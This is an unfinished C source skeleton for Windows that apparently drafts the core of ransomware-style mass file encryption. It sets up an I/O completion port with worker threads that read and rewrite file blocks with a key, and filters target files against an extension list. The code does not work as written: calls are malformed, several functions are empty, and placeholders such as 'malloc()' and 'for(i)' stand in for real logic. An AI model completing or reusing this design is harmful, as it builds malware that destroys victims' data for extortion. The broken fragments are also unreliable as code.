#define OMIT_LENGHT 512
#define SHOULD_OMIT 2048

char *exclude[]={".pdf",".txt"};
HANDLE CompletionPort;
int filesize(char *file)
{
FILE *filep = fopen(file);
fseek(0,filep,SEEK_END);
return 


}
int ncrypt(char *file)
{
malloc()
fread()
for(i)

}

int should_crypt(char *file)
{
for(i=0;i!=sizeof(exclude)/sizeof(char*);i++)
{
if(strstr(file,exclude[i])!=NULL)
{
return 0;
}
}
return 1;
}
bool block_write(overlapped_enc *ovl,LONGLONG offset)
{
LARGE_INTEGER li;
li.QuadPart = offset;
ovl->overlapped.Offset = li.LowPart;
ovl->overlapped.OffsetHigh = li.HighPart;





}
void crypt(char *key)
{
BOOL result;
DWORD CompletionKey;
overlapped_enc *OverLapped;
while(1)
  {
result = GetQueuedCompletionStatus(CompletionPort,&NumberOfBytes,CompletionKey,&OverLapped,INFINITE);
switch(OverLapped->operation)
  {
    case WRITE:


    break;

    case READ:


    break;

    



  }
  }
}

void crypt_all(char *key)
{
DWORD threads;
HANDLE thread;
  CompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE,0,0,threads)
    if(CompletionPort)
  {
do
  {
thread = CreateThread(0,0,crypt,key,0,0)

threads--
  }
while(threads)
  }

}
